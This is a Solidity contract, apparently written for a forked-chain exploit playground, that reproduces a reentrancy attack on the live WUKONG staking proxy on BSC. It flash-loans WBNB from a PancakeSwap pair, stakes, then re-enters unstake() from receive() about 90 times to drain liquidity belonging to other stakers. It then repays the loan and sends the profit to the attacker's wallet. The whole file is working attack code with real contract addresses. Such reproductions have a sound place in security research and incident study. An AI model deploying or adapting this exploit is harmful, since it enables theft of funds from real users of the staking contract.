// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Standalone, cheatcode-free synthetic exploit for the EVM Playground.
// Reproduces the WUKONG Staking classical reentrancy against the LIVE staking
// proxy on the BSC fork (block 86047026):
//   1. flash-loan WBNB from the Pancake WBNB/BUSD pair (self-funding, no external BNB),
//   2. stake the 2-BNB maximum to open one position (~890.84 LP),
//   3. call unstake() and RE-ENTER it from receive() ~90 times — each re-entry runs
//      removeLiquidityETH() with the SAME lpAmount because unstake() only zeroes the
//      position AFTER it sends BNB, draining LP that belongs to other stakers,
//   4. repay the flash loan and sweep the drained BNB to the attacker EOA.
//
// Note on gas: WBNB.withdraw() returns BNB via `transfer` (2300-gas stipend), which
// also lands in receive(). We gate re-entry behind the `inUnstake` flag (a single warm
// SLOAD) so receive() returns cheaply during withdraw and only re-enters during
// unstake(), whose `call{value:...}` forwards all remaining gas.

interface IStaking {
    function stake() external payable;
    function unstake() external;
    function hasStaked(address user) external view returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract WUKONGReentrancyExploit {
    // WUKONG staking proxy (EIP-1967 -> StakingUpgradeableV10)
    IStaking constant STAKING = IStaking(0x07D398c888c353565CF549bBeE3446791a49F285);
    IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    // Pancake WBNB/BUSD pair used as the flash-loan source (token0 == WBNB)
    IPancakePair constant FLASH_PAIR = IPancakePair(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);

    uint256 constant STAKE_AMOUNT = 2 ether; // MAX_STAKE_AMOUNT
    uint256 constant MAX_REENTER = 90; // bounded below the totalStake* underflow limit

    address public immutable owner;
    uint256 private reenterCount;
    bool private inUnstake; // gates re-entry so the withdraw stipend path is a no-op

    constructor(address owner_) {
        owner = owner_;
    }

    // Recorded entrypoint.
    function attack() external {
        // Flash-loan WBNB to fund the stake (repaid inside pancakeCall).
        FLASH_PAIR.swap(STAKE_AMOUNT, 0, address(this), abi.encode(STAKE_AMOUNT));

        // Sweep the drained BNB profit to the attacker EOA.
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }

    // Pancake flash-swap callback: we now hold `amount0` WBNB.
    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == address(FLASH_PAIR), "bad flash caller");
        uint256 borrowed = amount0;

        // Warm the `inUnstake` slot and keep it false: the receive() triggered by the
        // 2300-gas WBNB.withdraw stipend must return without an external call.
        inUnstake = false;
        WBNB.withdraw(borrowed); // WBNB -> BNB (fires receive(), no-op)
        STAKING.stake{value: STAKE_AMOUNT}();

        // Arm re-entry, then unstake(): it returns BNB to us (receive) BEFORE it closes
        // the position, so receive() re-enters unstake() with the same LP amount.
        inUnstake = true;
        STAKING.unstake();
        inUnstake = false;

        // Repay the flash loan (0.25% Pancake fee): borrowed * 10000 / 9975, rounded up.
        uint256 repay = (borrowed * 10000) / 9975 + 1;
        WBNB.deposit{value: repay}();
        WBNB.transfer(address(FLASH_PAIR), repay);
    }

    // Re-entry engine: fires each time unstake() sends us BNB (all gas forwarded).
    receive() external payable {
        if (inUnstake && reenterCount < MAX_REENTER && STAKING.hasStaked(address(this))) {
            reenterCount++;
            STAKING.unstake();
        }
    }
}
